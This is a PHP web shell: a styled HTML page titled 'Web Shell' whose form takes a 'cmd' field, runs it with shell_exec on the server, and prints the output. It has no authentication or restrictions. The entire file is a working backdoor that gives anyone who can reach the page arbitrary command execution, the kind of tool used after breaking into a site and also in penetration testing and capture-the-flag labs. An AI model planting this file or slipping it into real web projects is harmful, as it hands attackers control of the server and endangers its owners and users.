<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Web Shell</title>
    <style>
        * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }

        body {
            font-family: sans-serif;
            color: #14ff00;
            background-color: black;
        }

        main {
            margin: auto;
            max-width: 850px;
        }

        pre,
        input,
        button {
            border-radius: 5px;
        }

        pre,
        input,
        button {
            background-color: #efefef;
        }

        label {
            display: block;
        }

        input {
            width: 100%;
            background-color: white;
            border: 2px solid transparent;
            color: black;
        }

        input:focus {
            outline: none;
            background-color: white;
            border: 2px solid #e6e6e6;
        }

        button {
            border: none;
            cursor: pointer;
            margin-left: 5px;
        }

        button:hover {
            background-color: #e6e6e6;
        }

        pre,
        input,
        button {
            padding: 10px;
                color: black;
        }

        .form-group {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            padding: 15px 0;
        }
    </style>

</head>

<body>
    <?php
        if (!empty($_POST['cmd'])) {
            $cmd = shell_exec($_POST['cmd']);
        }
    ?>
    <main>
        <h1>Web Shell</h1>

        <form method="post">
            <label for="cmd"><strong>Command</strong></label>
            <div class="form-group">
                <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
                <button type="submit">Execute</button>
            </div>
        </form>

        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'){
            echo "<h2>Output</h2>";
            if (isset($cmd)){
                echo "<pre>".htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8')."</pre>";
            }
            else{
                echo "<pre><small>No result.</small></pre>";
            }
        } ?>
    </main>
</body>
</html>
